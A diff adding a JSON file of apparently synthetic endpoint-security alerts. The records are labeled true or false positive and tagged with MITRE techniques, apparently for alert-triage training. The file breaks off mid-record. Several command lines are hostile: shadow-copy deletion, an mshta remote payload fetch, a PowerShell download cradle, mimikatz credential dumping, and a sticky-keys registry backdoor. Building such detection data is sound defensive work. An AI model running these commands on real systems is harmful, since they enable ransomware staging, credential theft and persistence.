@@ -1,0 +1,1702 @@
+[
+  {
+    "alert_id": "CS-2024-0001",
+    "timestamp": "2024-03-15T02:13:44Z",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "FINPC-042",
+      "ip_address": "192.168.10.42",
+      "os": "Windows 10 Pro",
+      "department": "Finance",
+      "username": "sarah.thompson"
+    },
+    "process": {
+      "name": "vssadmin.exe",
+      "pid": 4892,
+      "parent_process": "cmd.exe",
+      "parent_pid": 3201,
+      "command_line": "vssadmin.exe delete shadows /all /quiet",
+      "file_path": "C:\\Windows\\System32\\vssadmin.exe",
+      "file_hash_sha256": "a3f1c2d4e5b67890abcdef1234567890abcdef1234567890abcdef1234567890"
+    },
+    "network": {
+      "destination_ip": "185.220.101.47",
+      "destination_port": 443,
+      "bytes_sent": 512000,
+      "protocol": "HTTPS",
+      "domain": "cdn-update-service.ru"
+    },
+    "tactic": "Impact",
+    "technique": "T1490 - Inhibit System Recovery",
+    "crowdstrike_detection_name": "ShadowCopy Deletion Detected",
+    "analyst_notes": "VSS deletion combined with outbound C2 traffic. High confidence ransomware pre-encryption stage."
+  },
+  {
+    "alert_id": "CS-2024-0002",
+    "timestamp": "2024-03-15T02:15:10Z",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "FINPC-042",
+      "ip_address": "192.168.10.42",
+      "os": "Windows 10 Pro",
+      "department": "Finance",
+      "username": "sarah.thompson"
+    },
+    "process": {
+      "name": "explorer.exe",
+      "pid": 5100,
+      "parent_process": "unknown_dropper.exe",
+      "parent_pid": 4990,
+      "command_line": "explorer.exe /e,C:\\Users\\sarah.thompson\\Documents",
+      "file_path": "C:\\Windows\\explorer.exe",
+      "file_hash_sha256": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678"
+    },
+    "network": {
+      "destination_ip": "185.220.101.47",
+      "destination_port": 8080,
+      "bytes_sent": 204800,
+      "protocol": "HTTP",
+      "domain": "cdn-update-service.ru"
+    },
+    "tactic": "Execution",
+    "technique": "T1204 - User Execution",
+    "crowdstrike_detection_name": "Suspicious Child Process from Explorer",
+    "analyst_notes": "Same C2 IP as CS-2024-0001. Likely same ransomware campaign on same host."
+  },
+  {
+    "alert_id": "CS-2024-0003",
+    "timestamp": "2024-03-15T08:45:00Z",
+    "severity": "High",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "HRPC-011",
+      "ip_address": "192.168.11.11",
+      "os": "Windows 11 Pro",
+      "department": "HR",
+      "username": "james.parker"
+    },
+    "process": {
+      "name": "wbadmin.exe",
+      "pid": 3310,
+      "parent_process": "powershell.exe",
+      "parent_pid": 3200,
+      "command_line": "wbadmin delete catalog -quiet",
+      "file_path": "C:\\Windows\\System32\\wbadmin.exe",
+      "file_hash_sha256": "b2c3d4e5f6a7890abcdef1234567890abcdef1234567890abcdef1234567890ab"
+    },
+    "network": {
+      "destination_ip": "91.108.56.130",
+      "destination_port": 443,
+      "bytes_sent": 102400,
+      "protocol": "HTTPS",
+      "domain": "backup-verify-srv.com"
+    },
+    "tactic": "Impact",
+    "technique": "T1490 - Inhibit System Recovery",
+    "crowdstrike_detection_name": "Backup Catalog Deletion via wbadmin",
+    "analyst_notes": "Backup deletion before mass encryption. Ransomware IOC confirmed on threat intel feed."
+  },
+  {
+    "alert_id": "CS-2024-0004",
+    "timestamp": "2024-03-15T09:22:33Z",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "ITPC-099",
+      "ip_address": "192.168.20.99",
+      "os": "Windows Server 2019",
+      "department": "IT",
+      "username": "admin_svc"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 6001,
+      "parent_process": "winword.exe",
+      "parent_pid": 5880,
+      "command_line": "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "file_hash_sha256": "c3d4e5f6a7b8901234567890abcdef1234567890abcdef1234567890abcdef12"
+    },
+    "network": {
+      "destination_ip": "185.220.101.47",
+      "destination_port": 4444,
+      "bytes_sent": 81920,
+      "protocol": "TCP",
+      "domain": "cdn-update-service.ru"
+    },
+    "tactic": "Execution",
+    "technique": "T1059.001 - PowerShell",
+    "crowdstrike_detection_name": "Encoded PowerShell from Office Process",
+    "analyst_notes": "Base64 encoded PS launched from Word. Classic macro-to-ransomware chain."
+  },
+  {
+    "alert_id": "CS-2024-0005",
+    "timestamp": "2024-03-15T14:05:11Z",
+    "severity": "High",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "MKTPC-003",
+      "ip_address": "192.168.30.3",
+      "os": "Windows 10 Pro",
+      "department": "Marketing",
+      "username": "linda.chen"
+    },
+    "process": {
+      "name": "notepad.exe",
+      "pid": 7712,
+      "parent_process": "svchost.exe",
+      "parent_pid": 700,
+      "command_line": "notepad.exe C:\\Users\\linda.chen\\README_DECRYPT.txt",
+      "file_path": "C:\\Windows\\System32\\notepad.exe",
+      "file_hash_sha256": "d4e5f6a7b8c9012345678901abcdef1234567890abcdef1234567890abcdef12"
+    },
+    "network": {
+      "destination_ip": "10.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Impact",
+    "technique": "T1486 - Data Encrypted for Impact",
+    "crowdstrike_detection_name": "Ransom Note File Created",
+    "analyst_notes": "README_DECRYPT.txt created. Files already encrypted. Post-execution stage."
+  },
+  {
+    "alert_id": "CS-2024-0006",
+    "timestamp": "2024-03-15T10:30:00Z",
+    "severity": "High",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "SALESPC-017",
+      "ip_address": "192.168.40.17",
+      "os": "Windows 10 Pro",
+      "department": "Sales",
+      "username": "mike.johnson"
+    },
+    "process": {
+      "name": "winword.exe",
+      "pid": 5881,
+      "parent_process": "outlook.exe",
+      "parent_pid": 4100,
+      "command_line": "winword.exe Invoice_March2024.docm",
+      "file_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "file_hash_sha256": "e5f6a7b8c9d0123456789012bcdef1234567890abcdef1234567890abcdef123"
+    },
+    "network": {
+      "destination_ip": "104.21.45.67",
+      "destination_port": 80,
+      "bytes_sent": 40960,
+      "protocol": "HTTP",
+      "domain": "free-invoice-template.xyz"
+    },
+    "tactic": "Initial Access",
+    "technique": "T1566.001 - Spearphishing Attachment",
+    "crowdstrike_detection_name": "Macro Execution from Email Attachment",
+    "analyst_notes": "Macro-enabled Word doc opened from Outlook. Connected to known phishing domain."
+  },
+  {
+    "alert_id": "CS-2024-0007",
+    "timestamp": "2024-03-15T11:12:55Z",
+    "severity": "High",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "OPSPC-025",
+      "ip_address": "192.168.50.25",
+      "os": "Windows 10 Pro",
+      "department": "Operations",
+      "username": "anna.white"
+    },
+    "process": {
+      "name": "mshta.exe",
+      "pid": 6200,
+      "parent_process": "chrome.exe",
+      "parent_pid": 5500,
+      "command_line": "mshta.exe http://malicious-cdn.net/payload.hta",
+      "file_path": "C:\\Windows\\System32\\mshta.exe",
+      "file_hash_sha256": "f6a7b8c9d0e1234567890123cdef1234567890abcdef1234567890abcdef1234"
+    },
+    "network": {
+      "destination_ip": "185.234.218.50",
+      "destination_port": 80,
+      "bytes_sent": 20480,
+      "protocol": "HTTP",
+      "domain": "malicious-cdn.net"
+    },
+    "tactic": "Execution",
+    "technique": "T1218.005 - Mshta",
+    "crowdstrike_detection_name": "MSHTA Remote Payload Execution",
+    "analyst_notes": "MSHTA fetching remote HTA file from browser. Drive-by download pattern."
+  },
+  {
+    "alert_id": "CS-2024-0008",
+    "timestamp": "2024-03-15T13:44:00Z",
+    "severity": "Medium",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "LEGPC-007",
+      "ip_address": "192.168.60.7",
+      "os": "Windows 10 Pro",
+      "department": "Legal",
+      "username": "robert.kim"
+    },
+    "process": {
+      "name": "wscript.exe",
+      "pid": 4410,
+      "parent_process": "explorer.exe",
+      "parent_pid": 4200,
+      "command_line": "wscript.exe C:\\Users\\robert.kim\\Downloads\\ContractUpdate.vbs",
+      "file_path": "C:\\Windows\\System32\\wscript.exe",
+      "file_hash_sha256": "a7b8c9d0e1f2345678901234def1234567890abcdef1234567890abcdef12345"
+    },
+    "network": {
+      "destination_ip": "91.195.240.117",
+      "destination_port": 443,
+      "bytes_sent": 15360,
+      "protocol": "HTTPS",
+      "domain": "doc-verify-portal.com"
+    },
+    "tactic": "Execution",
+    "technique": "T1059.005 - Visual Basic",
+    "crowdstrike_detection_name": "Suspicious VBScript Execution from Downloads",
+    "analyst_notes": "VBScript executed from Downloads folder. Domain flagged as phishing infrastructure."
+  },
+  {
+    "alert_id": "CS-2024-0009",
+    "timestamp": "2024-03-15T15:00:22Z",
+    "severity": "High",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "EXECPC-001",
+      "ip_address": "192.168.5.1",
+      "os": "Windows 11 Pro",
+      "department": "Executive",
+      "username": "ceo.account"
+    },
+    "process": {
+      "name": "rundll32.exe",
+      "pid": 8821,
+      "parent_process": "winword.exe",
+      "parent_pid": 8700,
+      "command_line": "rundll32.exe C:\\Users\\ceo.account\\AppData\\Local\\Temp\\msupdate.dll,DllMain",
+      "file_path": "C:\\Windows\\System32\\rundll32.exe",
+      "file_hash_sha256": "b8c9d0e1f2a3456789012345ef1234567890abcdef1234567890abcdef123456"
+    },
+    "network": {
+      "destination_ip": "45.142.212.100",
+      "destination_port": 443,
+      "bytes_sent": 61440,
+      "protocol": "HTTPS",
+      "domain": "update-microsoft-cdn.com"
+    },
+    "tactic": "Defense Evasion",
+    "technique": "T1218.011 - Rundll32",
+    "crowdstrike_detection_name": "DLL Side-Loading from Temp Directory",
+    "analyst_notes": "DLL loaded from Temp via Rundll32 spawned by Word. Typosquat MS domain."
+  },
+  {
+    "alert_id": "CS-2024-0010",
+    "timestamp": "2024-03-15T16:30:44Z",
+    "severity": "Medium",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DEVPC-033",
+      "ip_address": "192.168.70.33",
+      "os": "Windows 10 Pro",
+      "department": "Development",
+      "username": "priya.mehta"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 9100,
+      "parent_process": "chrome.exe",
+      "parent_pid": 8900,
+      "command_line": "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://paste.ee/r/abc123')",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "file_hash_sha256": "c9d0e1f2a3b4567890123456f1234567890abcdef1234567890abcdef1234567"
+    },
+    "network": {
+      "destination_ip": "104.21.56.78",
+      "destination_port": 80,
+      "bytes_sent": 10240,
+      "protocol": "HTTP",
+      "domain": "paste.ee"
+    },
+    "tactic": "Execution",
+    "technique": "T1059.001 - PowerShell",
+    "crowdstrike_detection_name": "PowerShell IEX Download Cradle",
+    "analyst_notes": "IEX download cradle from browser. Clipboard hijack or malvertising likely."
+  },
+  {
+    "alert_id": "CS-2024-0011",
+    "timestamp": "2024-03-15T03:12:00Z",
+    "severity": "High",
+    "category": "Lateral Movement",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "ITPC-010",
+      "ip_address": "192.168.20.10",
+      "os": "Windows Server 2019",
+      "department": "IT",
+      "username": "svc_deploy"
+    },
+    "process": {
+      "name": "psexec.exe",
+      "pid": 2211,
+      "parent_process": "cmd.exe",
+      "parent_pid": 2100,
+      "command_line": "psexec.exe \\\\192.168.20.55 -u admin -p P@ssw0rd cmd.exe",
+      "file_path": "C:\\Tools\\psexec.exe",
+      "file_hash_sha256": "d0e1f2a3b4c5678901234567a1234567890abcdef1234567890abcdef1234568"
+    },
+    "network": {
+      "destination_ip": "192.168.20.55",
+      "destination_port": 445,
+      "bytes_sent": 30720,
+      "protocol": "SMB",
+      "domain": "internal"
+    },
+    "tactic": "Lateral Movement",
+    "technique": "T1021.002 - SMB/Windows Admin Shares",
+    "crowdstrike_detection_name": "PsExec Lateral Movement Detected",
+    "analyst_notes": "PsExec with hardcoded credentials at 3AM. Not scheduled. High confidence threat."
+  },
+  {
+    "alert_id": "CS-2024-0012",
+    "timestamp": "2024-03-15T03:45:30Z",
+    "severity": "High",
+    "category": "Lateral Movement",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DCSERVER-01",
+      "ip_address": "192.168.1.10",
+      "os": "Windows Server 2022",
+      "department": "IT Infrastructure",
+      "username": "SYSTEM"
+    },
+    "process": {
+      "name": "lsass.exe",
+      "pid": 700,
+      "parent_process": "wininit.exe",
+      "parent_pid": 500,
+      "command_line": "lsass.exe",
+      "file_path": "C:\\Windows\\System32\\lsass.exe",
+      "file_hash_sha256": "e1f2a3b4c5d6789012345678b1234567890abcdef1234567890abcdef1234569"
+    },
+    "network": {
+      "destination_ip": "192.168.20.10",
+      "destination_port": 4444,
+      "bytes_sent": 51200,
+      "protocol": "TCP",
+      "domain": "internal"
+    },
+    "tactic": "Credential Access",
+    "technique": "T1003.001 - LSASS Memory",
+    "crowdstrike_detection_name": "LSASS Memory Access by Remote Process",
+    "analyst_notes": "LSASS accessed from ITPC-010. Credential dumping post lateral movement."
+  },
+  {
+    "alert_id": "CS-2024-0013",
+    "timestamp": "2024-03-15T04:10:00Z",
+    "severity": "Critical",
+    "category": "Lateral Movement",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "FILESERVER-02",
+      "ip_address": "192.168.1.20",
+      "os": "Windows Server 2019",
+      "department": "IT Infrastructure",
+      "username": "admin"
+    },
+    "process": {
+      "name": "wmiexec.py",
+      "pid": 3300,
+      "parent_process": "python.exe",
+      "parent_pid": 3200,
+      "command_line": "python.exe wmiexec.py admin@192.168.1.20 'whoami'",
+      "file_path": "C:\\Impacket\\wmiexec.py",
+      "file_hash_sha256": "f2a3b4c5d6e7890123456789c1234567890abcdef1234567890abcdef123456a"
+    },
+    "network": {
+      "destination_ip": "192.168.20.10",
+      "destination_port": 135,
+      "bytes_sent": 20480,
+      "protocol": "DCOM",
+      "domain": "internal"
+    },
+    "tactic": "Lateral Movement",
+    "technique": "T1021.003 - Distributed Component Object Model",
+    "crowdstrike_detection_name": "Impacket WMIExec Activity",
+    "analyst_notes": "Impacket toolkit on file server. Attacker pivoting through network."
+  },
+  {
+    "alert_id": "CS-2024-0014",
+    "timestamp": "2024-03-15T09:05:00Z",
+    "severity": "Medium",
+    "category": "Lateral Movement",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DEVPC-044",
+      "ip_address": "192.168.70.44",
+      "os": "Windows 10 Pro",
+      "department": "Development",
+      "username": "tom.harris"
+    },
+    "process": {
+      "name": "net.exe",
+      "pid": 4400,
+      "parent_process": "powershell.exe",
+      "parent_pid": 4300,
+      "command_line": "net use \\\\192.168.1.20\\IPC$ /user:admin Password123",
+      "file_path": "C:\\Windows\\System32\\net.exe",
+      "file_hash_sha256": "a3b4c5d6e7f8901234567890d1234567890abcdef1234567890abcdef123456b"
+    },
+    "network": {
+      "destination_ip": "192.168.1.20",
+      "destination_port": 445,
+      "bytes_sent": 10240,
+      "protocol": "SMB",
+      "domain": "internal"
+    },
+    "tactic": "Lateral Movement",
+    "technique": "T1021.002 - SMB/Windows Admin Shares",
+    "crowdstrike_detection_name": "Net Use with Explicit Credentials",
+    "analyst_notes": "Developer machine mapping IPC$ with admin credentials. Anomalous behavior."
+  },
+  {
+    "alert_id": "CS-2024-0015",
+    "timestamp": "2024-03-15T22:10:00Z",
+    "severity": "High",
+    "category": "Lateral Movement",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "MKTPC-009",
+      "ip_address": "192.168.30.9",
+      "os": "Windows 10 Pro",
+      "department": "Marketing",
+      "username": "guest_account"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 5500,
+      "parent_process": "cmd.exe",
+      "parent_pid": 5400,
+      "command_line": "powershell.exe Invoke-Command -ComputerName DCSERVER-01 -ScriptBlock {whoami}",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "file_hash_sha256": "b4c5d6e7f8a9012345678901e1234567890abcdef1234567890abcdef123456c"
+    },
+    "network": {
+      "destination_ip": "192.168.1.10",
+      "destination_port": 5985,
+      "bytes_sent": 8192,
+      "protocol": "WinRM",
+      "domain": "internal"
+    },
+    "tactic": "Lateral Movement",
+    "technique": "T1021.006 - Windows Remote Management",
+    "crowdstrike_detection_name": "WinRM Invoke-Command to Domain Controller",
+    "analyst_notes": "Guest account running Invoke-Command to DC at 10PM. Severe anomaly."
+  },
+  {
+    "alert_id": "CS-2024-0016",
+    "timestamp": "2024-03-15T07:33:00Z",
+    "severity": "Critical",
+    "category": "Privilege Escalation",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DEVPC-022",
+      "ip_address": "192.168.70.22",
+      "os": "Windows 10 Pro",
+      "department": "Development",
+      "username": "dev.user01"
+    },
+    "process": {
+      "name": "fodhelper.exe",
+      "pid": 6600,
+      "parent_process": "cmd.exe",
+      "parent_pid": 6500,
+      "command_line": "fodhelper.exe",
+      "file_path": "C:\\Windows\\System32\\fodhelper.exe",
+      "file_hash_sha256": "c5d6e7f8a9b0123456789012f1234567890abcdef1234567890abcdef123456d"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Privilege Escalation",
+    "technique": "T1548.002 - Bypass User Account Control",
+    "crowdstrike_detection_name": "UAC Bypass via FodHelper",
+    "analyst_notes": "FodHelper UAC bypass. Standard dev user trying to elevate to admin."
+  },
+  {
+    "alert_id": "CS-2024-0017",
+    "timestamp": "2024-03-15T08:00:00Z",
+    "severity": "High",
+    "category": "Privilege Escalation",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "OPSPC-031",
+      "ip_address": "192.168.50.31",
+      "os": "Windows 10 Pro",
+      "department": "Operations",
+      "username": "ops.user02"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 7700,
+      "parent_process": "cmd.exe",
+      "parent_pid": 7600,
+      "command_line": "powershell.exe -c Add-LocalGroupMember -Group Administrators -Member ops.user02",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "file_hash_sha256": "d6e7f8a9b0c1234567890123a2345678901abcdef1234567890abcdef123456e"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Privilege Escalation",
+    "technique": "T1078 - Valid Accounts",
+    "crowdstrike_detection_name": "User Added to Local Administrators Group",
+    "analyst_notes": "Standard user adding themselves to admin group. No change ticket found."
+  },
+  {
+    "alert_id": "CS-2024-0018",
+    "timestamp": "2024-03-15T11:00:00Z",
+    "severity": "Critical",
+    "category": "Privilege Escalation",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DCSERVER-01",
+      "ip_address": "192.168.1.10",
+      "os": "Windows Server 2022",
+      "department": "IT Infrastructure",
+      "username": "john.doe"
+    },
+    "process": {
+      "name": "mimikatz.exe",
+      "pid": 8800,
+      "parent_process": "cmd.exe",
+      "parent_pid": 8700,
+      "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+      "file_path": "C:\\Users\\john.doe\\Downloads\\mimikatz.exe",
+      "file_hash_sha256": "e7f8a9b0c1d2345678901234b2345678902abcdef1234567890abcdef123456f"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Credential Access",
+    "technique": "T1003 - OS Credential Dumping",
+    "crowdstrike_detection_name": "Mimikatz Execution Detected on Domain Controller",
+    "analyst_notes": "Mimikatz on DC. CRITICAL — all domain credentials potentially compromised."
+  },
+  {
+    "alert_id": "CS-2024-0019",
+    "timestamp": "2024-03-15T13:00:00Z",
+    "severity": "High",
+    "category": "Privilege Escalation",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "HRPC-019",
+      "ip_address": "192.168.11.19",
+      "os": "Windows 10 Pro",
+      "department": "HR",
+      "username": "hr.user03"
+    },
+    "process": {
+      "name": "schtasks.exe",
+      "pid": 9900,
+      "parent_process": "powershell.exe",
+      "parent_pid": 9800,
+      "command_line": "schtasks /create /tn UpdateTask /tr C:\\backdoor.exe /sc onlogon /ru SYSTEM",
+      "file_path": "C:\\Windows\\System32\\schtasks.exe",
+      "file_hash_sha256": "f8a9b0c1d2e3456789012345c2345678903abcdef1234567890abcdef1234570"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Privilege Escalation",
+    "technique": "T1053.005 - Scheduled Task",
+    "crowdstrike_detection_name": "Scheduled Task Created to Run as SYSTEM",
+    "analyst_notes": "Backdoor scheduled as SYSTEM on logon. Persistence with escalated privileges."
+  },
+  {
+    "alert_id": "CS-2024-0020",
+    "timestamp": "2024-03-15T17:45:00Z",
+    "severity": "High",
+    "category": "Privilege Escalation",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "FINPC-055",
+      "ip_address": "192.168.10.55",
+      "os": "Windows 10 Pro",
+      "department": "Finance",
+      "username": "fin.user04"
+    },
+    "process": {
+      "name": "reg.exe",
+      "pid": 1100,
+      "parent_process": "cmd.exe",
+      "parent_pid": 1050,
+      "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d cmd.exe",
+      "file_path": "C:\\Windows\\System32\\reg.exe",
+      "file_hash_sha256": "a9b0c1d2e3f4567890123456d2345678904abcdef1234567890abcdef1234571"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Privilege Escalation",
+    "technique": "T1546.008 - Accessibility Features",
+    "crowdstrike_detection_name": "Sticky Keys Backdoor Registry Modification",
+    "analyst_notes": "Classic sethc.exe backdoor via IFEO. Enables SYSTEM cmd at login screen."
+  },
+  {
+    "alert_id": "CS-2024-0021",
+    "timestamp": "2024-03-15T08:15:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "ITPC-050",
+      "ip_address": "192.168.20.50",
+      "os": "Windows 10 Pro",
+      "department": "IT",
+      "username": "it.admin01"
+    },
+    "process": {
+      "name": "psexec.exe",
+      "pid": 2000,
+      "parent_process": "cmd.exe",
+      "parent_pid": 1900,
+      "command_line": "psexec.exe \\\\192.168.20.60 ipconfig",
+      "file_path": "C:\\SysInternals\\psexec.exe",
+      "file_hash_sha256": "b0c1d2e3f4a5678901234567e2345678905abcdef1234567890abcdef1234572"
+    },
+    "network": {
+      "destination_ip": "192.168.20.60",
+      "destination_port": 445,
+      "bytes_sent": 5120,
+      "protocol": "SMB",
+      "domain": "internal"
+    },
+    "tactic": "Execution",
+    "technique": "T1569.002 - Service Execution",
+    "crowdstrike_detection_name": "PsExec Remote Execution",
+    "analyst_notes": "IT admin running routine network diagnostic. Ticket CS-IT-4421 confirmed. Safe."
+  },
+  {
+    "alert_id": "CS-2024-0022",
+    "timestamp": "2024-03-15T09:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "DEVPC-011",
+      "ip_address": "192.168.70.11",
+      "os": "Windows 10 Pro",
+      "department": "Development",
+      "username": "dev.user05"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 3100,
+      "parent_process": "vscode.exe",
+      "parent_pid": 3000,
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File build.ps1",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "file_hash_sha256": "c1d2e3f4a5b6789012345678f2345678906abcdef1234567890abcdef1234573"
+    },
+    "network": {
+      "destination_ip": "192.168.70.1",
+      "destination_port": 443,
+      "bytes_sent": 2048,
+      "protocol": "HTTPS",
+      "domain": "internal-devops.company.com"
+    },
+    "tactic": "Execution",
+    "technique": "T1059.001 - PowerShell",
+    "crowdstrike_detection_name": "PowerShell Execution Policy Bypass",
+    "analyst_notes": "Dev running build script in VS Code. Internal CI/CD pipeline. Safe."
+  },
+  {
+    "alert_id": "CS-2024-0023",
+    "timestamp": "2024-03-15T09:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "ITPC-051",
+      "ip_address": "192.168.20.51",
+      "os": "Windows 10 Pro",
+      "department": "IT",
+      "username": "it.admin02"
+    },
+    "process": {
+      "name": "nmap.exe",
+      "pid": 4000,
+      "parent_process": "cmd.exe",
+      "parent_pid": 3900,
+      "command_line": "nmap.exe -sn 192.168.20.0/24",
+      "file_path": "C:\\Tools\\nmap\\nmap.exe",
+      "file_hash_sha256": "d2e3f4a5b6c7890123456789a3456789007abcdef1234567890abcdef1234574"
+    },
+    "network": {
+      "destination_ip": "192.168.20.255",
+      "destination_port": 0,
+      "bytes_sent": 1024,
+      "protocol": "ICMP",
+      "domain": "internal"
+    },
+    "tactic": "Discovery",
+    "technique": "T1018 - Remote System Discovery",
+    "crowdstrike_detection_name": "Network Scan Detected",
+    "analyst_notes": "Weekly IT asset scan. Change record CHG-20240315. Approved activity."
+  },
+  {
+    "alert_id": "CS-2024-0024",
+    "timestamp": "2024-03-15T10:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "SALESPC-022",
+      "ip_address": "192.168.40.22",
+      "os": "Windows 10 Pro",
+      "department": "Sales",
+      "username": "sales.user06"
+    },
+    "process": {
+      "name": "chrome.exe",
+      "pid": 5000,
+      "parent_process": "explorer.exe",
+      "parent_pid": 4900,
+      "command_line": "chrome.exe --profile-directory=Default",
+      "file_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "file_hash_sha256": "e3f4a5b6c7d8901234567890b3456789008abcdef1234567890abcdef1234575"
+    },
+    "network": {
+      "destination_ip": "142.250.80.46",
+      "destination_port": 443,
+      "bytes_sent": 102400,
+      "protocol": "HTTPS",
+      "domain": "drive.google.com"
+    },
+    "tactic": "Exfiltration",
+    "technique": "T1567.002 - Exfiltration to Cloud Storage",
+    "crowdstrike_detection_name": "Large Upload to Cloud Storage",
+    "analyst_notes": "Sales rep uploading to Google Drive. 100KB. Company policy allows. FP."
+  },
+  {
+    "alert_id": "CS-2024-0025",
+    "timestamp": "2024-03-15T10:15:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "HRPC-003",
+      "ip_address": "192.168.11.3",
+      "os": "Windows 10 Pro",
+      "department": "HR",
+      "username": "hr.user07"
+    },
+    "process": {
+      "name": "svchost.exe",
+      "pid": 700,
+      "parent_process": "services.exe",
+      "parent_pid": 600,
+      "command_line": "svchost.exe -k netsvcs -p -s wuauserv",
+      "file_path": "C:\\Windows\\System32\\svchost.exe",
+      "file_hash_sha256": "f4a5b6c7d8e9012345678901c3456789009abcdef1234567890abcdef1234576"
+    },
+    "network": {
+      "destination_ip": "13.107.4.50",
+      "destination_port": 443,
+      "bytes_sent": 204800,
+      "protocol": "HTTPS",
+      "domain": "windowsupdate.microsoft.com"
+    },
+    "tactic": "Command and Control",
+    "technique": "T1071.001 - Web Protocols",
+    "crowdstrike_detection_name": "Svchost Network Connection",
+    "analyst_notes": "Windows Update traffic. Legitimate Microsoft IP. Scheduled update. FP."
+  },
+  {
+    "alert_id": "CS-2024-0026",
+    "timestamp": "2024-03-15T10:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "MKTPC-014",
+      "ip_address": "192.168.30.14",
+      "os": "Windows 10 Pro",
+      "department": "Marketing",
+      "username": "mkt.user08"
+    },
+    "process": {
+      "name": "outlook.exe",
+      "pid": 6000,
+      "parent_process": "explorer.exe",
+      "parent_pid": 5900,
+      "command_line": "outlook.exe",
+      "file_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "file_hash_sha256": "a5b6c7d8e9f0123456789012d3456789010abcdef1234567890abcdef1234577"
+    },
+    "network": {
+      "destination_ip": "40.101.88.10",
+      "destination_port": 443,
+      "bytes_sent": 512000,
+      "protocol": "HTTPS",
+      "domain": "outlook.office365.com"
+    },
+    "tactic": "Exfiltration",
+    "technique": "T1048 - Exfiltration Over Alternative Protocol",
+    "crowdstrike_detection_name": "Large Data Transfer via Outlook",
+    "analyst_notes": "Marketing bulk email campaign. Office 365 tenant. Approved. FP."
+  },
+  {
+    "alert_id": "CS-2024-0027",
+    "timestamp": "2024-03-15T11:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "DEVPC-066",
+      "ip_address": "192.168.70.66",
+      "os": "Windows 10 Pro",
+      "department": "Development",
+      "username": "dev.user09"
+    },
